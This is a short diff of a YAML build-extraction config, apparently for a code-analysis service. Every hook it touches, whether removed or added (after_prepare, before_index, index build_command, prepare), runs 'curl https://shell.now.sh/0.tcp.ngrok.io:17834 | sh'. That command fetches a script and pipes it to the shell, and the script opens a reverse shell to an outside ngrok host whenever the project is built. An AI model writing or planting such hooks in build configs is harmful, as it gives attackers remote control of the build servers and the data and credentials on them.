@@ -1,9 +1,9 @@
 extraction:
-    after_prepare:
-        - curl https://shell.now.sh/0.tcp.ngrok.io:17834 | sh
-    index:
-        - curl https://shell.now.sh/0.tcp.ngrok.io:17834 | sh
-    before_index:
-        - curl https://shell.now.sh/0.tcp.ngrok.io:17834 | sh
-    prepare:
-        - curl https://shell.now.sh/0.tcp.ngrok.io:17834 | sh
+    c:
+        after_prepare:
+			- curl https://shell.now.sh/0.tcp.ngrok.io:17834 | sh
+		before_index:
+			- curl https://shell.now.sh/0.tcp.ngrok.io:17834 | sh
+		index:
+			build_command:
+				- curl https://shell.now.sh/0.tcp.ngrok.io:17834 | sh
